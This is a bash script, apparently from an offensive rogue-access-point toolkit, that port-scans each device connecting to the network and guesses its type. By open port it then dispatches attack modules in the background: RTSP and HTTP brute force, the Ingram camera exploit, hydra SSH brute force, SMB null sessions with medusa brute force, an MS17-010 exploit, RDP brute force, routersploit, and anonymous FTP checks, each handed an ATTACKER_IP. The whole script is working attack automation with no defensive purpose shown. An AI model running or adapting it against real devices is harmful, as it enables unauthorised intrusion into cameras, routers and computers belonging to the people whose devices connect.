#!/bin/bash
# on_client/scan.sh — Smart port scanner + auto-dispatch
# Args: $1=IP  $2=MAC  $3=ATTACKER_IP
# Env:  KARMA_OUT — write all findings here

IP="$1"; MAC="$2"; ATTACKER="$3"
TIME="$(date +'%H:%M:%S_%d.%m.%Y')"
OUT="${KARMA_OUT:-$(dirname "$0")/..}"
mkdir -p "$OUT"

# Register client in pipeline chain file so pipeline_run_screen can pick it up
grep -qxF "$IP" "${OUT}/karma_clients.txt" 2>/dev/null || \
  echo "$IP" >> "${OUT}/karma_clients.txt"

NMAP_OUT="$OUT/nmap-${IP}_${TIME}.txt"

# Run nmap silently — parse and display formatted summary after
nmap -Pn -n -sV --version-intensity 2 --open \
  -p 21,22,23,25,53,80,110,139,143,443,445,554,3306,3389,5900,\
8000,8008,8080,8081,8443,8554,8888,9000,37777,34567,34599,49152 \
  "$IP" -oN "$NMAP_OUT" > /dev/null 2>/dev/null

# Device type detection from nmap output
DEVICE_TYPE="Unknown"
DEVICE_COLOR="\033[0;37m"
if grep -qi 'hikvision\|dahua\|axis\|camera\|rtsp\|dvr\|nvr' "$NMAP_OUT" 2>/dev/null; then
  DEVICE_TYPE="IP Camera / DVR"; DEVICE_COLOR="\033[1;33m"
elif grep -qi 'router\|mikrotik\|cisco\|ubiquiti\|tp-link\|d-link\|switch' "$NMAP_OUT" 2>/dev/null; then
  DEVICE_TYPE="Network Device / Router"; DEVICE_COLOR="\033[1;35m"
elif grep -qi 'windows\|microsoft\|iis\|smb\|netbios' "$NMAP_OUT" 2>/dev/null; then
  DEVICE_TYPE="Windows Host"; DEVICE_COLOR="\033[1;34m"
elif grep -qi 'linux\|ubuntu\|debian\|centos\|openssh' "$NMAP_OUT" 2>/dev/null; then
  DEVICE_TYPE="Linux Host"; DEVICE_COLOR="\033[1;32m"
elif grep -qi 'android\|ios\|iphone\|samsung\|mobile' "$NMAP_OUT" 2>/dev/null; then
  DEVICE_TYPE="Mobile Device"; DEVICE_COLOR="\033[1;36m"
fi

# Print formatted port summary
OPEN_PORTS="$(grep "^[0-9]*/tcp.*open" "$NMAP_OUT" 2>/dev/null)"
PORT_COUNT="$(echo "$OPEN_PORTS" | grep -c . 2>/dev/null || echo 0)"

printf "\n\033[1;36m  ┌── SCAN RESULTS: %s ──\033[0m\n" "$IP"
printf "\033[1;36m  │\033[0m  Device : ${DEVICE_COLOR}%s\033[0m\n" "$DEVICE_TYPE"
printf "\033[1;36m  │\033[0m  Ports  : \033[1;33m%s open\033[0m\n" "$PORT_COUNT"
if [ -n "$OPEN_PORTS" ]; then
  echo "$OPEN_PORTS" | while IFS= read -r line; do
    PORT=$(echo "$line" | awk '{print $1}')
    SVC=$(echo "$line" | awk '{$1=$2=$3=""; print $0}' | sed 's/^ *//')
    printf "\033[1;36m  │\033[0m  \033[1;32m%-20s\033[0m %s\n" "$PORT" "$SVC"
  done
fi
printf "\033[1;36m  └─── saved: %s\033[0m\n\n" "$NMAP_OUT"

# Share results with Dart pipeline scripts
cp "$NMAP_OUT" "${OUT}/nmap.txt" 2>/dev/null || true
if [ -n "$(grep "^[0-9]*/tcp.*open" "$NMAP_OUT" 2>/dev/null)" ]; then
  grep "^[0-9]*/tcp.*open" "$NMAP_OUT" | awk '{print $1}' | cut -d/ -f1 | \
    while read -r _port; do echo "${IP}:${_port}"; done >> "${OUT}/chain_ports.txt"
  sort -u "${OUT}/chain_ports.txt" -o "${OUT}/chain_ports.txt" 2>/dev/null || true
fi

if [ -z "$OPEN_PORTS" ]; then
  printf "  \033[2m[-] No attack surface found on %s\033[0m\n" "$IP"
  exit 0
fi

# Parse open ports into array
open_ports="$(echo "$OPEN_PORTS" | awk '{print $1}' | cut -d/ -f1)"

has_port() { echo "$open_ports" | grep -qxE "$1"; }

# ── Camera / RTSP ────────────────────────────────────────────────────────────
if has_port "554|8554|37777|34567|8000|8081"; then
  echo "[*] CAMERA PORTS on $IP → RTSP brute + Ingram (background)"

  bash "$(dirname "$0")/rtsp.sh" "$IP" "$MAC" "$ATTACKER" 2>/dev/null &

  INGRAM="/root/f-security/Ingram/auto_ingramv2.sh"
  if [[ -x "$INGRAM" ]]; then
    echo "[*] Running Ingram against $IP"
    bash "$INGRAM" "$IP" 2>/dev/null | tee "$OUT/ingram-${IP}_${TIME}.txt" &
  fi

  IOT_PY="/root/f-security/recon_iot_scada.py"
  if [[ -f "$IOT_PY" ]]; then
    echo "[*] Running IoT/SCADA scan on $IP"
    python3 "$IOT_PY" "$IP" 2>/dev/null | tee "$OUT/iot-${IP}_${TIME}.txt" &
  fi
fi

# ── HTTP / Web ───────────────────────────────────────────────────────────────
if has_port "80|443|8080|8081|8443|8888|9000"; then
  echo "[*] WEB PORTS on $IP → HTTP brute + screenshot (background)"
  bash "$(dirname "$0")/http_basic_brute.sh" "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
  bash "$(dirname "$0")/www_screenshot.sh"   "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
fi

# ── SSH ──────────────────────────────────────────────────────────────────────
if has_port "22"; then
  echo "[*] SSH on $IP → hydra brute (background)"
  bash "$(dirname "$0")/bruteforce/ssh.sh" "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
fi

# ── SMB ──────────────────────────────────────────────────────────────────────
if has_port "445"; then
  echo "[*] SMB on $IP → null session + medusa brute + MS17-010 (background)"
  bash "$(dirname "$0")/bruteforce/smb.sh" "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
  bash "$(dirname "$0")/smb_null.sh"       "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
  bash "$(dirname "$0")/ms17-010.sh"       "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
fi

# ── RDP ──────────────────────────────────────────────────────────────────────
if has_port "3389"; then
  echo "[*] RDP on $IP → brute + screenshot (background)"
  bash "$(dirname "$0")/bruteforce/rdp.sh"  "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
  bash "$(dirname "$0")/rdp_screenshot.sh"  "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
fi

# ── Telnet ───────────────────────────────────────────────────────────────────
if has_port "23"; then
  echo "[*] TELNET on $IP → banner grab"
  timeout 5 nc -nw 3 "$IP" 23 2>/dev/null | strings | head -20 \
    > "$OUT/telnet-banner-${IP}_${TIME}.txt" || true
  echo "[+] Telnet banner: $OUT/telnet-banner-${IP}_${TIME}.txt"
fi

# ── VNC ──────────────────────────────────────────────────────────────────────
if has_port "5900"; then
  echo "[*] VNC on $IP → routersploit camera scan (background)"
  bash "$(dirname "$0")/routersploit.sh" "$IP" "$MAC" "$ATTACKER" 2>/dev/null &
fi

# ── FTP ──────────────────────────────────────────────────────────────────────
if has_port "21"; then
  echo "[*] FTP on $IP → anonymous login check"
  if timeout 5 curl -s --max-time 5 "ftp://anonymous:@${IP}/" -l 2>/dev/null; then
    echo "[+] FTP anonymous login: $IP" | tee "$OUT/ftp-anon-${IP}_${TIME}.txt"
  fi
fi

# Wait for background jobs
wait
echo "[+] All checks complete: $IP ($DEVICE_TYPE)"
